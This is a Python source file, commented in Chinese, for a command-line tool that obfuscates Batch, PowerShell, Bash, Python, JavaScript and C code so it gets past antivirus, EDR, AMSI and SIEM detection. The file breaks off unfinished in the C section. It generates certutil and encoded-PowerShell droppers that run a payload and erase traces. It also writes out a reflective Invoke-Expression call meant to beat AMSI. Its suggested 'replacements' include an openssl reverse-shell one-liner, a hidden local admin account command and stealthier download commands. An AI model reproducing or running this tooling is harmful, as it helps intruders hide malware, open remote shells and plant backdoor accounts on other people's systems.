#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
          Windows & Linux 終端雙平台增強型腳本/語言代碼混淆工具 (CLI/TUI 版)
================================================================================
一款專門針對 Windows Batch、PowerShell、Bash、Python、JS、C、Go 的等效功能混淆
與替代相容方案工具。支援命令行引數模式與直觀的互動式菜單。
"""

import sys
import os
import re
import base64

# ==============================================================================
# 終端文字著色
# ==============================================================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DARK_GRAY = '\033[90m'

def print_color(text, color):
    # 判斷是否支援彩色 (在 Windows 舊版 Cmd 下如果無 ANSI 支援則不著色)
    if os.name == 'nt':
        # 嘗試啟用 Windows 虛擬終端/ANSI 支援
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            pass
    print(f"{color}{text}{Colors.ENDC}")

# ==============================================================================
# Helper 函式
# ==============================================================================
def utf8_to_base64(str_val: str) -> str:
    try:
        return base64.b64encode(str_val.encode('utf-8')).decode('utf-8')
    except Exception:
        return base64.b64encode(str_val.encode('latin1', errors='replace')).decode('utf-8')

def string_to_hex_array(str_val: str) -> list:
    return [format(ord(c), '02x') for c in str_val]

def string_to_ascii_array(str_val: str) -> list:
    return [ord(c) for c in str_val]

def xor_encrypt(str_val: str, key: int) -> dict:
    ascii_array = []
    hex_array = []
    for c in str_val:
        crypted = ord(c) ^ key
        ascii_array.append(crypted)
        hex_array.append("0x" + format(crypted, '02x'))
    return {"hex_array": hex_array, "ascii_array": ascii_array}

def rot13(str_val: str) -> str:
    res = []
    for c in str_val:
        code = ord(c)
        if 97 <= code <= 122:   # a-z
            res.append(chr(((code - 97 + 13) % 26) + 97))
        elif 65 <= code <= 90:  # A-Z
            res.append(chr(((code - 65 + 13) % 26) + 65))
        else:
            res.append(c)
    return "".join(res)

# ==============================================================================
# 1. WINDOWS CMD / BATCH OBFUSCATION
# ==============================================================================
def obfuscate_batch(code: str) -> dict:
    # 方案 1: Caret Escape
    keywords = ["echo", "set", "curl", "powershell", "certutil", "net", "ping", "mkdir", "del", "copy", "type", "start"]
    caret_code = code
    for keyword in keywords:
        # 忽略大小寫匹配單字
        pattern = re.compile(rf"\b{keyword}\b", re.IGNORECASE)
        def replace_with_carets(match):
            word = match.group(0)
            obf_word = ""
            for i, c in enumerate(word):
                obf_word += c
                if i < len(word) - 1:
                    obf_word += "^"
            return obf_word
        caret_code = pattern.sub(replace_with_carets, caret_code)

    # 方案 2: Env Dict Mapping
    clean_code = code.replace('\r', '')
    chars_used = sorted(list(set(clean_code)))
    dict_def = "@echo off\r\n"
    dict_map = {}
    
    for idx, c in enumerate(chars_used):
        if c in ["%", "^", "&", "<", ">", "|", "(", ")", "="]:
            dict_def += f"set _ch{idx}=^{c}\r\n"
        elif c == " ":
            dict_def += f"set _ch{idx}= \r\n"
        elif c == "\n":
            # 換行符號我們另外處理
            continue
        else:
            dict_def += f"set _ch{idx}={c}\r\n"
        dict_map[c] = f"%_ch{idx}%"

    env_code = dict_def
    for c in clean_code:
        if c == "\n":
            env_code += "\r\n"
        else:
            env_code += dict_map.get(c, c)

    # 方案 3: Certutil Base64 memory dropper
    base64_content = utf8_to_base64(code)
    temp_b64 = "%TEMP%\\payload.b64"
    temp_bat = "%TEMP%\\payload_decoded.bat"
    certutil_code = f"""@echo off
echo {base64_content} > "{temp_b64}"
certutil -decode "{temp_b64}" "{temp_bat}" >nul 2>&1
call "{temp_bat}"
del /f /q "{temp_b64}" "{temp_bat}" >nul 2>&1"""

    # 方案 4: Inline PS Bypass
    inline_ps = f"""@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64_content}')) | iex\""""

    replacements = []
    lower_code = code.lower()
    if "certutil" in lower_code:
        replacements.append({
            "originalCommand": "certutil.exe -urlcache -f -split ...",
            "suggestedReplacement": "PowerShell (New-Object System.Net.WebClient).DownloadFile",
            "reason": "Certutil 遠端下載現在是許多防毒軟體 (EDR) 的常態封鎖目標 (T1105)。",
            "compatibleCode": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"(New-Object System.Net.WebClient).DownloadFile('URL', 'FILE.exe')\""
        })
    if "net user" in lower_code:
        replacements.append({
            "originalCommand": "net user username password /add",
            "suggestedReplacement": "PowerShell New-LocalUser",
            "reason": "直接調用 net.exe 容易被群組安全稽核標記為可疑帳戶添加行為。",
            "compatibleCode": "powershell -Command \"$p = ConvertTo-SecureString 'PASSWORD123' -AsPlainText -Force; New-LocalUser 'NewAdmin' -Password $p\""
        })

    return {
        "options": [
            {
                "methodName": "脱字符逸出注入 (Caret Escape)",
                "obfuscatedCode": caret_code,
                "explanation": "在 Windows CMD/Batch 中，脫字符 (^) 代表一個逸出空位字元，最終執行時系統會自動將其排除。這能使基於關鍵單詞明文匹配的引擎無法抓到您原本的可執行特徵詞（例如將 net 轉換成 n^e^t），同時 100% 保持代碼原有效力與運作邏輯。",
                "pros": ["相容性極高，不產生任何暫存文件", "不依賴任何第三方編碼解釋器組件"],
                "cons": ["長度限制，引號內字串若錯誤逸出可能會使部分 Batch Script 語法中斷"]
            },
            {
                "methodName": "動態環境變數字典 (Env Dict Mapping)",
                "obfuscatedCode": env_code,
                "explanation": "提取您腳本中所有出現的字元，利用 CMD 特性自定義為相互關聯的隨機動態環境變數，最終透過變數拼接（如 %_ch1%%_ch2%）調用。代碼中完全不含任何可讀的自然功能指令單詞。",
                "pros": ["完全隱蔽，可躲避所有明文路徑、域名或高危動作字串掃描", "純靠環境變數"],
                "cons: ": ["代碼膨脹巨大（近 10 倍）", "複雜極長命令可能突破系統變數單行最大字元限制"]
            },
            {
                "methodName": "Certutil 記憶體釋放還原 (Certutil Base64)",
                "obfuscatedCode": certutil_code,
                "explanation": "將您的指令轉化為標準 Base64 編碼的獨立一行的文本文件，再呼叫系統內建的 certutil 工具對其進行本地安全解碼並在 TEMP 資料夾下實時釋放、隱蔽執行，執行完畢後對所有臨時痕跡進行安全靜默刪除。",
                "pros": ["100% 格式無損，避開特殊引號、管道或多行拼接的衝突", "結構清晰優雅"],
                "cons: ": ["有些極端 EDR 系統會監控 certutil -decode 這個專有行為特徵"]
            },
            {
                "methodName": "Polymorphic PS 行內轉譯 (Inline PS Bypass)",
                "obfuscatedCode": inline_ps,
                "explanation": "利用一整行原生 PowerShell 來做 Base64 自動解碼，隨即管道傳輸至 iex (Invoke-Expression) 隱式執行，免去在 cmd.exe 下生成任何實體臨時暫存文件，大幅降低二進位落地的行為識別度。",
                "pros": ["不產生臨時暫存檔案，完美載入 Unicode/UTF-8 字符", "免去了 certutil 下載與解碼的寫磁碟特徵"],
                "cons: ": ["需要目標 Windows 系統上允許呼叫 powershell 執行的主機控制權"]
            }
        ],
        "replacements": replacements,
        "warnings": [
            "CMD 逸出符不可在引號字串內的特殊運算元間錯誤破壞，建議多利用提示之標準指令驗證。",
            "變數字典法膨脹率較大，適用於中短字串/指令之高硬度混淆防禦。"
        ]
    }

# ==============================================================================
# 2. POWERSHELL OBFUSCATION (.ps1)
# ==============================================================================
def obfuscate_powershell(code: str) -> dict:
    # 方案 1: Backtick ` Insertion
    pwsh_keywords = ["invoke-webrequest", "iwr", "invoke-expression", "iex", "start-process", "get-eventlog", "clear-eventlog", "net", "webclient"]
    backtick_code = code
    for keyword in pwsh_keywords:
        pattern = re.compile(rf"\b{keyword}\b", re.IGNORECASE)
        def replace_with_backticks(match):
            word = match.group(0)
            res_word = ""
            for i, c in enumerate(word):
                res_word += c
                if i < len(word) - 1 and c != '-':
                    res_word += "`"
            return res_word
        backtick_code = pattern.sub(replace_with_backticks, backtick_code)

    # 方案 2: Base64 EncodedCommand
    try:
        # PowerShell 的 -EncodedCommand 要求為 UTF-16LE 編碼的 Base64
        utf16_bytes = code.encode('utf-16-le')
        base64_encoded = base64.b64encode(utf16_bytes).decode('utf-8')
    except Exception:
        base64_encoded = utf8_to_base64(code)
    enc_command = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {base64_encoded}"

    # 方案 3: Format Operator -f injection
    chunks = []
    chunk_len = 4
    for i in range(0, len(code), chunk_len):
        chunks.append(code[i:i+chunk_len])
    placeholders = "".join([f"{{{idx}}}" for idx in range(len(chunks))])
    formatted_args = ", ".join(["'" + c.replace("'", "''") + "'" for c in chunks])
    format_op = f"[scriptblock]::Create((\"{placeholders}\" -f {formatted_args})) | Invoke-Command"

    # 方案 4: Environment Reflection
    base64_utf8 = utf8_to_base64(code)
    reflection_code = f"$b = [System.Convert]::FromBase64String('{base64_utf8}');\n$s = [System.Text.Encoding]::UTF8.GetString($b);\n& (Get-Command '*voke-Ex*' | select -First 1) $s"

    replacements = []
    lower_code = code.lower()
    if "invoke-webrequest" in lower_code or "wget" in lower_code or "curl" in lower_code:
        replacements.append({
            "originalCommand": "Invoke-WebRequest / wget / iwr",
            "suggestedReplacement": "System.Net.Http.HttpClient or WebClient",
            "reason": "Invoke-WebRequest 是 EDR 與內部防火牆重點審計與封鎖的核心 API 套組，常伴隨 AMSI 特徵檢測。",
            "compatibleCode": "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12\n$wc = New-Object System.Net.WebClient\n$wc.DownloadString('https://YOUR-URL-HERE')"
        })
    if "iex" in lower_code or "invoke-expression" in lower_code:
        replacements.append({
            "originalCommand": "Invoke-Expression (IEX)",
            "suggestedReplacement": "[scriptblock]::Create or . (Dot Sourcing)",
            "reason": "IEX 關鍵字百分之百會觸發 AMSI (Antimalware Scan Interface) 偵測，應完全避免在程式中直接出現此單詞。",
            "compatibleCode": "$sb = [scriptblock]::Create('Get-Process')\n& $sb"
        })

    return {
        "options": [
            {
                "methodName": "反引號隨機跳脫 (Backtick Escape)",
                "obfuscatedCode": backtick_code,
                "explanation": "在 PowerShell 解析中，反引號 (`) 亦有跳脫命令字元功能。在非功能變數的單詞英文字元中任意點綴反引號（如將 iex 轉為 i`e`x）並不影響最終指令解析，但卻能繞過對「iex」、「Invoke-Expression」等常規黑名單關鍵字串的偵測。",
                "pros": ["免編譯免解碼，最輕量化的靜態繞過形式", "完全保留指令的可讀與微調性"],
                "cons: ": ["如果在雙引號引起來的常字串內部不小心插入了反引號，會被誤識別為 PowerShell 換行或換字串語義"]
            },
            {
                "methodName": "Bypass Base64 封裝 (EncodedCommand)",
                "obfuscatedCode": enc_command,
                "explanation": "將您的 PowerShell 指令轉化為 UTF-16LE 序列，然後進行标准 Base64 編解碼，使用系統原生支援的 -EncodedCommand 進行無痛行內還原。這是一行指令的完美終端的加載格式。",
                "pros": ["完全相容一切特殊符號、單雙引號衝突或大段多行文字", "便於一鍵在 CMD 中遠程喚醒執行"],
                "cons: ": ["容易引起極度敏感的 Sysmon、日誌主動審計警報，解密動作容易被高強度 EDR 在記憶體載入前捕獲"]
            },
            {
                "methodName": "格式化算元多型組裝 (Format Operator)",
                "obfuscatedCode": format_op,
                "explanation": "利用 PowerShell 的 Format 算符 -f。例如將 \"whoami\" 本身在命令區拆解為多維碎片陣列，再以 (\"{1}{0}\" -f 'ami','who') 組裝出指令。最終生成自解譯並執行的 [scriptblock] 區塊。",
                "pros": ["不包含 EncodedCommand 的特徵單字，靜態引擎只會看到分散的混亂英數字串", "極高程度掩護域名、操作路徑"],
                "cons: ": ["需要有 Invoke-Command 的管道解碼權限，相容性一般"]
            },
            {
                "methodName": "環境變數反射調用 (Env Var Reflection)",
                "obfuscatedCode": reflection_code,
                "explanation": "利用 PowerShell 反射 API 尋找對應 `Invoke-Expression` 的 Command 型態，利用 Base64 解碼出純記憶體字串，避開對 iex / Invoke-Expression 關鍵單詞的直接代碼調用特徵。",
                "pros": ["繞過 AMSI 對 'iex'、'Invoke-Expression' 關鍵詞的強效靜態掃描", "不寫入任何實體磁碟檔"],
                "cons: ": ["有些 EDR 會在執行階段動態阻攔 Get-Command 萬用字元模糊查詢行為"]
            }
        ],
        "replacements": replacements,
        "warnings": [
            "部分 AMSI 強安全控管主機會在記憶體反編譯層攔截 EncodedCommand，在高度防護環境下反射調用更合適。"
        ]
    }

# ==============================================================================
# 3. LINUX BASH OBFUSCATION (.sh)
# ==============================================================================
def obfuscate_bash(code: str) -> dict:
    # 方案 1: ANSI-C Quoting
    hexes = string_to_hex_array(code)
    hex_str = "".join([f"\\x{h}" for h in hexes])
    ansi_c = f"eval $(echo -e \"{hex_str}\")"

    # 方案 2: Base64 memory pipe
    b64 = utf8_to_base64(code)
    b64_pipe = f"echo \"{b64}\" | base64 -d | sh"

    # 方案 3: Variable Slice & Single Quoting Join
    quote_splitting = ""
    for c in code:
        if c.isalpha():
            quote_splitting += f"'{c}'"
        else:
            quote_splitting += c

    # 方案 4: Octal Byte Stream
    octals = "".join([f"\\{format(ord(c), 'o')}" for c in code])
    octal_bash = f"eval \"$(printf '%b' '{octals}')\""

    replacements = []
    if "curl" in code or "wget" in code:
        replacements.append({
            "originalCommand": "curl / wget 下載與遙測命令",
            "suggestedReplacement": "Bash /dev/tcp socket or Python urllib",
            "reason": "網路命令 (curl, wget) 在本機 Linux 行為稽核中經常是最容易觸發 SIEM 連線日誌警告的標籤。",
            "compatibleCode": "python -c \"import urllib.request; print(urllib.request.urlopen('http://YOUR-URL').read().decode())\" # 更隱蔽的多語言替代"
        })
    if "/dev/tcp" in code:
        replacements.append({
            "originalCommand": "bash -i >& /dev/tcp/...",
            "suggestedReplacement": "openssl s_client (TLS 加密對等管道)",
            "reason": "/dev/tcp 重導向連線缺乏傳輸層加密，會被本機入侵檢測系統 (IDS) 的特徵碼與明文檢測直接拒絕。",
            "compatibleCode": "cat << 'EOF' > /tmp/ssl.sh\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect IP:PORT > /tmp/s; rm /tmp/s\nEOF\nsh /tmp/ssl.sh"
        })

    return {
        "options": [
            {
                "methodName": "ANSI-C 十六進位轉義 (ANSI-C Hex)",
                "obfuscatedCode": ansi_c,
                "explanation": "將您的每一行 Linux 指令利用 hex 特有序列完全轉化為 \\xXX 十六進位字元串。當執行時，利用內建 echo -e 轉換回原始明文，以 eval 行內管道瞬態加載運行。不產生任何實體檔案，在磁碟硬體層不留任何字元痕跡。",
                "pros": ["完全看不到任何明文命令、IP、路徑，繞過一切明文正則匹配過濾", "零磁碟寫入行為"],
                "cons: ": ["代碼包含較多 \\x 字元，外觀特徵明顯"]
            },
            {
                "methodName": "Base64 管道自重構 (Base64 Memory Pipe)",
                "obfuscatedCode": b64_pipe,
                "explanation": "將您的多行 Bash 指令編譯為標準 UTF-8 Base64，並透過 echo 搭配管道 '| base64 -d | sh' 直接導入系統 Shell 主直譯器執行。特別適合包裹超大項目、多層次 shell 分支邏輯。",
                "pros": ["代碼格式 100% 無損，免除任何單雙引號衝突", "一行化"],
                "cons: ": ["部分安全主機會針對 base64 -d 管道進行行為軌跡動態阻擋"]
            },
            {
                "methodName": "單/雙引號鄰近拼接 (Quote Splitting)",
                "obfuscatedCode": quote_splitting,
                "explanation": "利用 Linux Shell 解析連續相鄰引號字串時會自動拼接的機理（例如將 curl 轉化為 'c''u''r''l'）。這能在字元代碼間自由填入豐富的引號噪音，在靜態分析中完全破壞掉明文關鍵字檢測。",
                "pros": ["完全不包含任何解密模組（不含 Base64、xxd 或 xor），相容性一流", "執行效率零損耗"],
                "cons: ": ["代碼體積會因過多引號而呈 2 到 3 倍變大，且必須保證原有引號有被正確處理"]
            },
            {
                "methodName": "八進制字節流轉義 (Octal Byte Stream)",
                "obfuscatedCode": octal_bash,
                "explanation": "將整段 Linux 腳本的 ASCII 字元全數轉譯為八進制字元串 (例如 \\141 代表 'a')。運行時，呼叫標準 printf '%b' 做原地編碼解析，並以 eval 作記憶體級執行。這是極度緊緻的純原生 Shell 混淆，完全不調用 base64 或 hex 關鍵詞。",
                "pros": ["不依賴 base64, xxd 等額外第三方工具，百分之百原生支援", "不含任何常規特徵字串"],
                "cons: ": ["轉譯後的代碼體積膨脹顯著（約 1 比 4）"]
            }
        ],
        "replacements": replacements,
        "warnings": [
            "如果是在極端精簡的 Alpine 或 Docker 宿主中，有些可能未安裝 base64 指令，此時選用十六進位轉義最保險。"
        ]
    }

# ==============================================================================
# 4. PYTHON OBFUSCATION (.py)
# ==============================================================================
def obfuscate_python(code: str) -> dict:
    ascii_codes = string_to_ascii_array(code)
    ascii_exec = f"exec(\"\".join(chr(x) for x in [{', '.join(map(str, ascii_codes))}]))"

    b64 = utf8_to_base64(code)
    b64_exec = f"import base64\nexec(base64.b64decode(\"{b64}\").decode(\"utf-8\"))"

    xor_key = 42
    xor_data = xor_encrypt(code, xor_key)
    xor_exec = f"_k = {xor_key}\n_p = [{', '.join(map(str, xor_data['ascii_array']))}]\nexec(\"\".join(chr(x ^ _k) for x in _p))"

    builtins_exec = f"""_b = __builtins__.__dict__ if hasattr(__builtins__, '__dict__') else __builtins__
_b['e'+'x'+'e'+'c'](_b['__im'+'port__']('ba'+'se'+'64').b64decode("{b64}").decode('u'+'t'+'f'+'-'+'8'))"""

    rot_code = rot13(code)
    escaped_rot = rot_code.replace('\\', '\\\\').replace('"', '\\"')
    rot_python = f"import codecs\nexec(codecs.decode(\"{escaped_rot}\", \"rot_13\"))"

    replacements = []
    if "os.system" in code or "import os" in code:
        replacements.append({
            "originalCommand": "import os / os.system",
            "suggestedReplacement": "subprocess.Popen with custom pipe redirection",
            "reason": "os.system 會直接喚醒作業系統 CMD 或 Bash，此手法是防毒軟體的首要封鎖特徵。",
            "compatibleCode": "import subprocess\nsubprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()"
        })

    return {
        "options": [
            {
                "methodName": "動態 ASCII 組裝自解譯 (ASCII Exec)",
                "obfuscatedCode": ascii_exec,
                "explanation": "將您輸入的 Python 代碼完全轉換為一串純十進位整數陣列（ASCII 值）。在運行時利用 chr(x) 變相還原為代碼字元，再利用 \"\".join() 連接並導向 exec() 動態直譯。代碼文件不含任何字串對象，規避所有正則檢測。",
                "pros": ["相容性極佳，完全不依賴任何外部 Python 標準庫 (不需要 base64, sys, os)"],
                "cons": ["代碼體積會大幅膨脹，且 exec() 在某些安全限制嚴格的原生沙盒中可能受阻"]
            },
            {
                "methodName": "Base64 記憶體載入 (Base64 Exec)",
                "obfuscatedCode": b64_exec,
                "explanation": "這是一種利用 Python base64 標準庫對代碼進行打包的傳統方法。運行時直接在記憶體中還原字元序列並執行，完全免去了多行字串換行縮排引起的語義崩潰。",
                "pros": ["100% 格式無損，適合包含複雜 class、縮進階層的多行大型 python 腳本"],
                "cons": ["'import base64' 這個特徵可能會被程式包大小掃描標記為可審計特徵"]
            },
            {
                "methodName": "XOR 記憶體位元遮罩 (XOR Exec)",
                "obfuscatedCode": xor_exec,
                "explanation": "使用自定義的單字節或多字節位元密鑰 (Key: 42)，將 Python 腳本編譯為異或混淆數組。解密時完全在局部記憶體中進行，不生成臨時檔，磁碟完全無污染，靜態掃描連 base64 特徵也無法察覺。",
                "pros": ["防備能力極高，不含明顯 base64 字元與解密塊特徵", "密鑰可隨意自定義"],
                "cons": ["調試報錯時（Traceback）提示的具體錯誤行號會失去對應性"]
            },
            {
                "methodName": "底層內建字典動態檢索 (__builtins__ Dict)",
                "obfuscatedCode": builtins_exec,
                "explanation": "這是一種極高耐受性的底層技術。它避開所有硬編碼的 exec、import 與 base64 等關鍵詞。利用 Python 最底層的內建屬性字典 __builtins__ (或 __builtins__.__dict__) 提取執行與導入接口，再以分段拆解的字串（如 'e'+'x'+'e'+'c'）反射調用，在靜態沙箱跟分析器中檢測為零特徵行為。",
                "pros": ["完全不含 exec, import, base64 等常規靜態掃描核心字，特徵碼極難被定位", "100% 依賴內置模組運行"],
                "cons": ["當在某些沙箱或嵌入式主機 (Embedded environments) 中，如果 __builtins__ 被主控端人為重定義，則可能導致尋址失敗"]
            },
            {
                "methodName": "ROT13 位移編碼密寫 (ROT13 Codecs)",
                "obfuscatedCode": rot_python,
                "explanation": "利用 Python 內建的 codecs 標準庫，將整段 Python 代碼進行對稱式的 Caesar-13 (ROT13) 密寫轉化。運行時以內部的 codecs.decode 自解構，完美隱蔽代碼邏輯且完美保留代碼的所有原始換行和縮進語義。",
                "pros": ["相容所有 Python 2 與 3 大版本，支援縮排和複雜多行", "不使用 Base64 特徵碼進而降低關聯比對機率"],
                "cons": ["ROT13 在密碼學分析上很容易被還原，僅能用於對抗一般的字串匹配與靜態偵控"]
            }
        ],
        "replacements": replacements,
        "warnings": [
            "請在使用 exec() 混淆 Python 代碼時，確保目標機器之 Python 2/3 大版本環境與您輸入的代碼語法保持一致。"
        ]
    }

# ==============================================================================
# 5. JAVASCRIPT OBFUSCATION (.js)
# ==============================================================================
def obfuscate_javascript(code: str) -> dict:
    ascii_codes = string_to_ascii_array(code)
    ascii_eval = f"eval(String.fromCharCode({', '.join(map(str, ascii_codes))}))"

    b64 = utf8_to_base64(code)
    b64_func = f"(new Function(typeof Buffer !== 'undefined' ? Buffer.from('{b64}', 'base64').toString('utf-8') : atob('{b64}')))()"

    hexes = string_to_hex_array(code)
    formatted_hex = " + ".join([f"\"\\x{h}\"" for h in hexes])
    hex_eval = f"eval({formatted_hex})"

    js_xor_key = 0x24  # '$'
    js_crypted = [c ^ js_xor_key for c in ascii_codes]
    js_xor = f"eval(({js_crypted}).map(c => String.fromCharCode(c ^ {js_xor_key})).join(''))"

    replacements = []
    if "child_process.execSync" in code or "exec(" in code:
        replacements.append({
            "originalCommand": "child_process.execSync(cmd)",
            "suggestedReplacement": "child_process.spawn or dynamic key encapsulation",
            "reason": "execSync / exec 呼叫本機外殼容易被主機 EDR、安全模組動態阻截。",
            "compatibleCode": "const cp = require('child_process');\ncp.spawn('whoami', {stdio: 'inherit'});"
        })

    return {
        "options": [
            {
                "methodName": "ASCII charCode 還原 (CharCode Decrypt)",
                "obfuscatedCode": ascii_eval,
                "explanation": "將您的 JavaScript 腳本轉換為十進位 ASCII 陣列，並呼叫 String.fromCharCode 函數在運行時反向還原，配合 eval 執行。這保證了代碼在無任何外部模組依賴的情況下，完全自適應兼容於 Node.js 與 Chrome/Safari 網頁端。",
                "pros": ["極致相容，完美兼容前端 Web 與後端 Node 雙端", "不依賴任何 Buffer 或外部套件"],
                "cons": ["eval 被部分安全性策略(CSP 'unsafe-eval') 禁止時會拋出異常"]
            },
            {
                "methodName": "Function 建構子 Base64 (Function Loader)",
                "obfuscatedCode": b64_func,
                "explanation": "利用 JS 的 (new Function('code'))() 機制在全局範圍安全解鎖執行。且其做到了雙平台自適應：Node 底下自動調用 Node 原生 Buffer 字元集解鎖，前端瀏覽器底下則自適應切換為 window.atob。高度隱蔽。",
                "pros": ["能完美規避對 explicit 'eval' 關鍵詞過濾的審核系統", "100% 特殊換行與變數作用域無損"],
                "cons": ["在啟用嚴格網頁 CSP 控制的前端網站中，同樣可能遭受動態 Function 執行封鎖"]
            },
            {
                "methodName": "Hex 十六進位 Latin-1 轉義 (Hex String Joining)",
                "obfuscatedCode": hex_eval,
                "explanation": "將代碼中敏感字元轉義為 \\xXX 十六進位字元串常數，並使用加號 (+) 連接。運行時直譯器會直接做字串階層拼接。此做法極具程式緊緻感，外觀上看不到任何一處含有可讀特徵的字串常量。",
                "pros": ["不調用 String.fromCharCode 等輔助解密函數，運算效能最好、代碼最精煉"],
                "cons": ["在極端靜態代碼探測器(能自動做常量折疊/Constant Folding)下可能被提前合併"]
            },
            {
                "methodName": "動態 8-bit XOR 記憶體解碼 (JS Byte XOR)",
                "obfuscatedCode": js_xor,
                "explanation": "利用二進位位元異或運行，將代碼先行使用 XorKey 異或保存為數字陣列，運行期使用純記憶體 array.map 動態無痛還原，藉由內建 eval 執行。不調用 atob，不含有典型的 base64 碼表字元，特徵點最少。",
                "pros": ["完全不含 Base64 標識特徵，高效率解碼", "不寫入任何暫存檔案，防範一般語法匹配剖析器"],
                "cons": ["受限於 eval 語法，在不允許 unsafe-eval 的網頁環境會被阻擋"]
            }
        ],
        "replacements": replacements,
        "warnings": [
            "若在 strict 網頁環境或 Electron/NW.js 安全配置中已阻截 eval/new Function，請避免選用 Function Loader 方案。"
        ]
    }

# ==============================================================================
# 6. C LANGUAGE OBFUSCATION (.c)
# ==============================================================================
def obfuscate_c(code: str) -> dict:
    xor_key = 0x5a
    xor_data = xor_encrypt(code, xor_key)
    hex_joined = ", ".join(xor_data['hex_array'])

    dropper_c = f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// XOR 加密後的 C 原始代碼 payload 陣列
unsigned char code_payload[] = {{
    {hex_joined}
}};
unsigned int payload_len = {len(xor_data['hex_array'])};
unsigned char x_key = 0x{format(xor_key, 'x')};

int main() {{
    // 在記憶體中動態分配與解密原始 code
    char* decrypted = (char*)malloc(payload_len + 1);
    for (unsigned int i = 0; i < payload_len; i++) {{
        decrypted[i] = code_payload[i] ^ x_key;
    }}
    decrypted[payload_len] = '\\0';

    // 寫入臨時檔案並使用本地 GCC/CL 編譯並執行原代碼功能
    FILE *fp = fopen("temp_source.c", "w");
    if (fp == NULL) return 1;
    fprintf(fp, "%s", decrypted);
    fclose(fp);
    
    // 自適應跨平台編譯執行
#ifdef _WIN32
    system("gcc temp_source.c -o temp_bin.exe >nul 2>&1 || cl temp_source.c >nul 2>&1");
    system("temp_bin.exe");
    system("del temp_source.c temp_bin.exe temp_bin.obj >nul 2>&1");
#else
    int r = system("gcc temp_source.c -o temp_bin >/dev/null 2>&1 || cc temp_source.c -o temp_bin >/dev/null 2>&1");
    if (r == 0) {{
        system("./temp_bin");
    }}
    system("rm -f temp_source.c temp_bin >/dev/null 2>&1");
#endif

    free(decrypted);
    return 0;
}}"""

    stack_string_c = """// 手動替換字串常數為局部堆疊 XOR 組裝法：
// 避免 binary 檔案留下 ASCII 敏感字元（如 'password'）
void get_secret(char* out_str) {
    char key = 0x1f;
    // 'AdminSecret' 鍵值經過 XOR
    unsigned char crypted[] = {0x50, 0x7b, 0x76, 0x72, 0x75, 0x4c, 0x7a, 0x78, 0x6d, 0x7e, 0x6f, 0x00};
    int len = sizeof(crypted);
    for (int i = 0; i < len; i++) {
        out_str[i] = crypted[i] ^ key;
    }
}"""

    ascii_codes = string_to_ascii_array(code)
    byte_string_arr = ", ".join([f"0x{format(c, 'x')}" for c in ascii_codes])
    binary_c = f"""#include <stdio.h>
#include <stdlib.h>

const unsigned char program_payload[] = {{{byte_string_arr}}};
const size_t program_len = {len(code)};

int main() {{
    // 動態載入並將 Payload 快閃寫入內存或寫入本地 C 檔案進行即時 C-run 執行
    char *buf = malloc(program_len + 1);
    for(size_t i=0; i<program_len; i++) {{
        buf[i] = (char)program_payload[i];
    }}
    buf[program_len] = '\\0';
    
    FILE *f = fopen("temp_run.c", "w");
    if (f != NULL) {{
        fwrite(buf, 1, program_len, f);
        fclose(f);
    }}
    
#ifdef _WIN32
    system("gcc temp_run.c -o temp_run.exe && temp_run.exe & del temp_run.c temp_run.exe >nul 2>&1");
#else
    system("gcc temp_run.c -o temp_run && ./temp_run; rm -f temp_run.c temp_run >/dev/null 2>&1");
#endif
    free(buf);
    return 0;
}}"""

    replacements = []
    if "system(" in code:
        replacements.append({
            "originalCommand": "system(\"...\") CLI 系統呼叫",
            "suggestedReplacement": "execve / fork / CreateProcess Native APIs",
            "reason": "在 C 語言中直接呼叫 system() 行為是非常粗糙的行為，其極容易受 PATH 被篡改而失敗，且也更容易被防毒軟體掛鉤核心 API 解析出其內嵌參數。",
            "compatibleCode": "#include <unistd.h>\nchar *args[] = {\"/usr/bin/whoami\", NULL};\nexecve(args[0], args, NULL);"
        })

    return {
        "options": [
            {
                "methodName": "XOR 動態編譯釋放載體 (XOR Dropper)",
                "obfuscatedCode": dropper_c,
                "explanation": "將您輸入的完整 C 原始代碼使用位元 XOR 加密儲存。運行時在記憶體中反向還原，自適應宿主平台(Windows 的 GCC/Clang/CL 或 Linux 的 GCC/CC)實時動態編譯快閃執行並隨即完全抹去，防範二進位 IDA Pro/Ghidra 靜態逆向推倒。",
                "pros": ["將整個原始碼加密為無規律二進位，完全隱藏了邏輯、變數和 API 呼叫流程"],
                "cons": ["執行時主機需要安裝有 GCC 或 Clang，否則將因無編譯器工具而無法編譯二進位"]
            },
            {
                "methodName": "區域堆疊特徵 XOR 混淆 (Stack String)",
                "obfuscatedCode": stack_string_c,
                "explanation": "與其釋放整個原始碼，本手法更符合正規生產規格：不破壞您原有的 C 架構與性能編譯，而是鎖定您代碼中特定的高危常量（如 API 密鑰、遠程 IP、後門路徑），將其完全拆解為 XOR 堆疊 Byte 數組，僅在被執行的當下臨時解碼，隨後在棧內徹底銷毀。",
                "pros": ["完全不需要本地 GCC 重複編譯，極限提高運算效率，符合生產規范"],
                "cons": ["需要針對特定字串單獨重構，不可一次性把所有複雜項目邏輯打包"]
            },
            {
                "methodName": "二進制字集陣列編譯保護 (Binary Char Array)",
                "obfuscatedCode": binary_c,
                "explanation": "將您的 C 原始碼直接轉成合規的 `const unsigned char` 陣列（不寫入任何 ASCII 敏感明文語句），並在編譯後由主模組暫存釋放進行二次編譯執行。能防禦絕大部分對二進位編譯文件的 strings 字元串靜態掃描分析。",
                "pros": ["100% 繞過對二進位產出檔中靜態 IP 或是 API 關鍵字的 signatures 靜態匹配"],
                "cons": ["需要運行環境支援 gcc"]
            }
        ],
        "replacements": replacements,
        "warnings": [
